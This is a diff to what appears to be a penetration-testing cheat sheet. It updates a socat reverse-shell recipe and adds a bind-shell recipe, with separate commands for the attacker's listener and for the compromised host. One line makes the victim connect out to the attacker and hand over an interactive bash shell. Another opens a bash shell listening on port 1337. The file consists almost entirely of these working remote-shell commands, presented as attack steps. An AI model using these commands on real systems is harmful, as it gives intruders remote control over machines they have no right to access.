@@ -47,11 +47,19 @@ sha1sum payload
 
 # Static binary
 
+# Reverse shell
 # https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
 # 1. attacker_host
-socat file:"$(tty)",raw,echo=0 tcp-listen:8081
+socat file:"$(tty)",raw,echo=0 tcp-listen:8081,reuseaddr
 # 2. vulnerable_host
-socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.2.15:8081
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$attacker_host_ip:8081
+
+# Bind shell
+# https://book.hacktricks.xyz/tunneling-and-port-forwarding#socat
+# 1. vulnerable_host
+socat EXEC:bash,pty,stderr,setsid,sigint,sane TCP-LISTEN:1337,reuseaddr,fork
+# 2. attacker_host
+socat FILE:"$(tty)",raw,echo=0 TCP:$vulnerable_host_ip:1337
 
 # Language specific
 # - [Reverse Shell Generator](https://www.revshells.com/)
